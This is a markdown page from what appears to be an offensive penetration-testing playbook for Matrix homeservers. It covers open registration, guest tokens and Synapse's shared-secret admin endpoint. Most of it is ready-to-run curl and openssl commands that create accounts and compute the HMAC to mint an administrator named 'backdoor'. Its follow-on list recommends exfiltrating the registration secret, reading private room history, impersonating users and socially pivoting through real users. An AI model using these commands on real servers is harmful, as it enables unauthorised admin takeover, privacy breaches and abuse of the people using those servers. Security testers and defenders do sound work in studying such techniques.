---
title: "Authentication: open registration, guest access, and shared-secret admin minting"
description: "A Matrix homeserver with open registration hands out accounts through the client-server register endpoint with only a dummy login stage. Guest registration yields a limited token without any credential. On Synapse, the shared-secret registration admin endpoint accepts an HMAC computed from the registration_shared_secret, so a leaked secret lets an attacker mint an administrator directly."
keywords:
  - Matrix registration
  - guest access
  - shared secret
  - Synapse admin
  - HMAC registration
---

# Authentication

Matrix entry has three attacker-relevant paths. Open registration through `/_matrix/client/v3/register` creates a normal account when the server offers only the `m.login.dummy` stage, which is common on self-hosted instances. Guest access through the same endpoint with `kind=guest` yields a restricted but real token with no input at all. And the strongest path is Synapse's shared-secret registration: the admin endpoint `/_synapse/admin/v1/register` authenticates not with a session but with an HMAC-SHA1 over the nonce, username, password, and admin flag keyed by the server's `registration_shared_secret`, so possession of that secret lets you create an administrator directly, bypassing the normal registration flow entirely.

## Preconditions

For open and guest registration, the register endpoint must accept the flow (confirmed in [enumeration](enumeration.md): a `flows` response with a `m.login.dummy` stage). For shared-secret admin minting, you need the `registration_shared_secret` value from the Synapse `homeserver.yaml`, obtained from a config leak, a readable backup, a repository, or a foothold on the host, and the `/_synapse/admin/v1/register` path must be routed (a `200` on `server_version`).

## Open and guest registration

```bash
# open registration: submit the dummy stage with the session from the initial probe
SESSION=$(curl -s -X POST https://target.lan/_matrix/client/v3/register -d '{}' | jq -r .session)
curl -s -X POST https://target.lan/_matrix/client/v3/register -H 'Content-Type: application/json' \
  -d "{\"auth\":{\"type\":\"m.login.dummy\",\"session\":\"$SESSION\"},\"username\":\"recon\",\"password\":\"Autumn2026!\"}"
# {"user_id":"@recon:target.lan","access_token":"syt_...","device_id":"..."}  => account created

# guest access: a token with no credential at all
curl -s -X POST "https://target.lan/_matrix/client/v3/register?kind=guest" -d '{}'
# returns an access_token for a guest user, enough to read world-readable rooms and the directory
```

The returned `access_token` is a bearer token: pass it as `Authorization: Bearer syt_...` on every later request to run authenticated enumeration, join rooms, and reach endpoints the directory search required a token for.

## Shared-secret admin minting

The admin register endpoint is a two-step nonce/HMAC flow. Fetch the nonce, compute the MAC, and submit:

```bash
BASE=https://target.lan
SECRET='the_registration_shared_secret_from_homeserver_yaml'
NONCE=$(curl -s $BASE/_synapse/admin/v1/register | jq -r .nonce)
USER=backdoor; PASS='Winter2026!'; ADMIN=admin

# MAC = HMAC-SHA1(secret, nonce\0user\0pass\0admin) over NUL-separated fields
MAC=$(printf '%s\0%s\0%s\0%s' "$NONCE" "$USER" "$PASS" "$ADMIN" \
  | openssl dgst -sha1 -hmac "$SECRET" | awk '{print $2}')

curl -s -X POST $BASE/_synapse/admin/v1/register -H 'Content-Type: application/json' -d \
  "{\"nonce\":\"$NONCE\",\"username\":\"$USER\",\"password\":\"$PASS\",\"admin\":true,\"mac\":\"$MAC\"}"
# {"user_id":"@backdoor:target.lan","access_token":"syt_...","device_id":"..."}  => you are now an admin
# {"errcode":"M_UNKNOWN","error":"HMAC incorrect"}  => wrong secret or mis-ordered fields
```

A `user_id` with a fresh `access_token` means the account exists and `admin:true` was honored, so the token drives the full Synapse admin API: list and deactivate users, reset passwords, read any room's state, and purge or export rooms. An `HMAC incorrect` error means the secret is wrong or the field order/NUL separators are off; the fields must be exactly `nonce`, `username`, `password`, and the literal `admin` or `notadmin` string, NUL-joined.

## Follow-on

- Any token (open, guest, or admin) is the credential for authenticated enumeration and for messaging real users to pivot socially.
- The admin token is server control: deactivating or impersonating users, reading private room history, and, combined with [server exploitation](server-exploitation.md), reaching the host behind the homeserver.
- The `registration_shared_secret` itself is worth exfiltrating from any config access precisely because it reduces admin creation to one request forever, until the secret is changed.

## References

- [Matrix client-server API (account registration)](https://spec.matrix.org/latest/client-server-api/#account-registration-and-management)
- [Synapse admin register endpoint](https://element-hq.github.io/synapse/latest/admin_api/register_api.html)
- [Synapse admin API documentation](https://element-hq.github.io/synapse/latest/usage/administration/admin_api/index.html)
